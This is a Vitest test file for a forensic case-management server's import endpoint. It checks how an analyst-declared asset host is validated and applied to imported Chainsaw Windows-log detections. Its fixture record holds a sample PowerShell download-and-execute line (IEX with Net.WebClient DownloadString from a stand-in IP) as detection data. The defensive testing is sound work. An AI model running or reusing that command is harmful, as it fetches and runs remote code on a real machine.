import { describe, it, expect } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import request from "supertest";
import { CaseStore } from "../../src/storage/caseStore.js";
import { createApp, buildRuntimePipeline } from "../../src/server.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { ImportMetaStore } from "../../src/analysis/importMeta.js";
import { POLL_TIMEOUT_MS } from "../helpers/poll.js";
import { waitForEvents } from "../helpers/caseWaits.js";

// #1496: the analyst's "asset for this import" on POST /cases/:id/import. A malformed value is a
// 400 with its reason (a silently ignored declaration would leave the analyst believing every
// record landed on the host); a valid one reaches the Windows-log importer as the collector
// fallback, so a bare export's records land on that host with the former-name note.

const OLD = "WIN-UK1GV882OK6";
const NEW = "DESKTOP-16OJFO6";

const BARE_CHAINSAW = [
  {
    EventTime: "2025-12-05T03:02:24Z",
    Detection: "Malicious PowerShell Keywords",
    Severity: "high",
    "Rule Group": "Sigma",
    Computer: OLD,
    Channel: "Microsoft-Windows-PowerShell/Operational",
    EventID: 4104,
    SystemData: {
      Computer: OLD,
      EventID: 4104,
      TimeCreated_attributes: { SystemTime: "2025-12-05T03:02:24Z" },
    },
    EventData: { ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')" },
  },
];

async function makeApp() {
  const root = await mkdtemp(join(tmpdir(), "dfir-import-asset-"));
  const store = new CaseStore(root);
  const stateStore = new StateStore(store);
  const pipeline = buildRuntimePipeline({
    provider: undefined,
    synthesisProvider: undefined,
    stateStore,
    store,
    imageLoader: async () => ({ base64: "AAAA", mimeType: "image/webp" }),
  });
  const app = createApp(store, { pipeline, stateStore, importMetaStore: new ImportMetaStore(store) });
  await request(app).post("/cases").send({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  return { app, stateStore };
}

describe("POST /cases/:id/import — assetHost (#1496)", { timeout: POLL_TIMEOUT_MS * 2 }, () => {
  it("refuses a malformed host with its reason, before anything is stored", async () => {
    const { app } = await makeApp();
    const res = await request(app)
      .post("/cases/c1/import")
      .send({ filename: "chainsaw.json", text: JSON.stringify(BARE_CHAINSAW), assetHost: "-bad.host" });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/asset host/i);
    const meta = await request(app).get("/cases/c1/import-meta");
    expect(JSON.stringify(meta.body)).not.toContain("chainsaw.json");
  });

  it("lands a bare export's records on the declared host, old name as a former name", async () => {
    const { app, stateStore } = await makeApp();
    const res = await request(app)
      .post("/cases/c1/import")
      .send({ filename: "chainsaw.json", text: JSON.stringify(BARE_CHAINSAW), assetHost: ` ${NEW}. ` });
    expect(res.status).toBe(202);
    expect(await waitForEvents(stateStore, "c1")).toBeGreaterThan(0);
    const state = await stateStore.load("c1");
    const row = state.forensicTimeline.find((e) => e.description.startsWith("Chainsaw"));
    expect(row?.asset).toBe(NEW);
    expect(row?.description).toContain(`[logged under former hostname ${OLD}]`);
    expect(state.hostRenames?.[0]).toMatchObject({ formerName: OLD, currentName: NEW, basis: "analyst" });
  });

  it("a blank value is no declaration", async () => {
    const { app, stateStore } = await makeApp();
    const res = await request(app)
      .post("/cases/c1/import")
      .send({ filename: "chainsaw.json", text: JSON.stringify(BARE_CHAINSAW), assetHost: "   " });
    expect(res.status).toBe(202);
    expect(await waitForEvents(stateStore, "c1")).toBeGreaterThan(0);
    const state = await stateStore.load("c1");
    expect(state.forensicTimeline.find((e) => e.description.startsWith("Chainsaw"))?.asset).toBe(OLD);
  });
});
